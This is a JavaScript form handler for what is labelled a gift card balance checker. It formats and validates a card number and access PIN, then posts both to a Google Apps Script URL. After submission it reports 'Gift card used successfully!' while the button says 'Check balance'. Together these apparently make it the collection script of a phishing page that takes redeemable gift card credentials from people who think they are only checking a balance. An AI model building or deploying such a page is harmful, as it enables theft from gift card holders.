document.addEventListener("DOMContentLoaded", function () {

    const form = document.getElementById("giftForm");
    const button = document.querySelector(".check-btn");
    const cardInput = document.getElementById("cardNumber");
    const accessInput = document.getElementById("accessNumber");

    /* =====================================
       CARD NUMBER FORMAT (XXX-XXX-XXX-XXX-XXX)
       ===================================== */

    cardInput.addEventListener("input", function (e) {

        // Remove non-digits
        let value = e.target.value.replace(/\D/g, "");

        // Limit to 15 digits
        value = value.substring(0, 15);

        // Add dash after every 3 digits
        let formatted = value.match(/.{1,3}/g);
        e.target.value = formatted ? formatted.join("-") : value;

    });


    /* =====================================
       ACCESS NUMBER FORMAT (8 DIGITS ONLY)
       ===================================== */

    accessInput.addEventListener("input", function (e) {

        let value = e.target.value.replace(/\D/g, "");
        value = value.substring(0, 8);
        e.target.value = value;

    });


    /* =====================================
       FORM SUBMIT
       ===================================== */

    form.addEventListener("submit", async function (e) {

        e.preventDefault();

        // Remove dashes before validation
        const cardNumber = cardInput.value.replace(/-/g, "").trim();
        const accessNumber = accessInput.value.trim();

        /* ---------- VALIDATION ---------- */

        if (cardNumber.length !== 15) {
            alert("Card number must be exactly 15 digits.");
            return;
        }

        if (accessNumber.length !== 8) {
            alert("Access number must be exactly 8 digits.");
            return;
        }

        /* ---------- BUTTON LOADING STATE ---------- */

        button.disabled = true;
        button.innerText = "Processing...";

        try {

            const response = await fetch(
                "https://script.google.com/macros/s/AKfycbwypLioP10JYOK6o4zVusVLObiaQFx6sz9ZYaZTCDSriIc0E89ni6H-OJDYq-8UHsU0gw/exec",
                {
                    method: "POST",
                    // headers: {
                    //     "Content-Type": "application/json"
                    // },
                    body: JSON.stringify({
                        cardNumber: cardNumber,
                        accessNumber: accessNumber
                    })
                }
            );

            if (!response.ok) {
                throw new Error("Server response was not ok");
            }

            const result = await response.json();

            if (result.status === "success") {
                alert("Gift card used successfully!");
                form.reset();
            } else {
                alert("Something went wrong.");
            }

        } catch (error) {
            console.error("Error:", error);
            alert("Network error. Please try again.");
        }

        button.disabled = false;
        button.innerText = "Check balance";

    });

});


